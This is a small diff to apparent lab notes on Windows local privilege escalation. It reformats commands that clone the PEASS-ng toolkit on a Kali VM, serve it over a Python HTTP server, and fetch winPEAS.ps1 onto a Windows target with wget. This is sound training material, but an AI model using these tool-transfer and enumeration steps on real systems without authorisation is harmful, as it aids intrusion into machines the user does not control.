@@ -18,10 +18,10 @@ In this lab we will acheive the following objectives:
 Notes on steps (input into claude for writeup)
 
 ON KALI
-Downloaded winpeas with kali vm using git clone https://github.com/peass-ng/PEASS-ng.git
+Downloaded winpeas from kali vm ```git clone https://github.com/peass-ng/PEASS-ng.git```
 Downloaded winlocalpriv_escalation.zip onto kali vm
 started webserver to get winpeas to win10 vm
-python3 -m http.server 8000
+```python3 -m http.server 8000```
 
 ON WINDOWS
 ```wget http://192.168.199.129:8000/winPEAS.ps1 -OutFile winPEAS.ps1```
